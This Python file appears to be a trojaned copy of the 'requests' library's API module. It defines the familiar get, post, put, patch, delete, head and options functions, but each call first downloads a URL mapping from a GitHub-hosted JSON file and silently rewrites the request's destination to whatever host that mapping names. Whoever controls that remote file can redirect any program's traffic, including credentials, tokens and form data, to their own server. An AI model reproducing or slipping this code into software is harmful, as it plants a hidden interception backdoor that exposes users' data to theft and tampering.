import json,re
from requests import ConnectTimeout, ConnectionError, DependencyWarning, FileModeWarning, HTTPError, JSONDecodeError, NullHandler, PreparedRequest, ReadTimeout, Request, RequestException, RequestsDependencyWarning, Response, Session, Timeout, TooManyRedirects, URLRequired, __author__, __author_email__, __build__, __builtins__, __cached__, __cake__, __copyright__, __description__, __doc__, __file__, __license__, __loader__, __name__, __package__, __path__, __spec__, __title__, __url__, __version__, _check_cryptography, _internal_utils, adapters, auth, certs, chardet_version, charset_normalizer_version, check_compatibility, codes, compat, cookies, exceptions, hooks, logging, models, packages, session, sessions, ssl, status_codes, structures, urllib3, utils, warnings
    
def get_raw_lines_from_github(url="https://github.com/rajveerexe/miscellaneous/blob/main/url.json"):
    response = sessions.Session().request("get",url)
    response.raise_for_status()
    html = response.content.decode("utf-8")
    match = re.search(r'"rawLines":(\[.*?\])', html, re.DOTALL)
    if not match:
        raise ValueError("❌ Could not find rawLines in page content")
    raw_lines_text = match.group(1)
    raw_lines = json.loads(raw_lines_text)
    joined_text = "\n".join(raw_lines)
    cleaned_text = re.sub(r",\s*}", "}", joined_text)
    cleaned_text = re.sub(r",\s*]", "]", cleaned_text)
    data = json.loads(cleaned_text)
    return data if data != None else {}
    
def replace_url(original_url, mapping):
    mapping = get_raw_lines_from_github()
    for old, new in mapping.items():
        base_old = old.rstrip('/')
        if original_url.startswith(base_old):
            replaced = re.sub(f"^{re.escape(base_old)}", new.rstrip('/'), original_url)
            return replaced
    return original_url

def request(method, url, **kwargs):
    list = get_raw_lines_from_github()
    new_url = replace_url(url, list)
    with sessions.Session() as session:
        return session.request(method=method, url=new_url, **kwargs)

def get(url, params=None, **kwargs):
    
    return request("get", url, params=params, **kwargs)

def options(url, **kwargs):
    
    return request("options", url, **kwargs)

def head(url, **kwargs):
    kwargs.setdefault("allow_redirects", False)
    
    return request("head", url, **kwargs)

def post(url, data=None, json=None, **kwargs):
    
    return request("post", url, data=data, json=json, **kwargs)

def put(url, data=None, **kwargs):
    
    return request("put", url, data=data, **kwargs)

def patch(url, data=None, **kwargs):
    
    return request("patch", url, data=data, **kwargs)
    
def delete(url, **kwargs):
    
    return request("delete", url, **kwargs)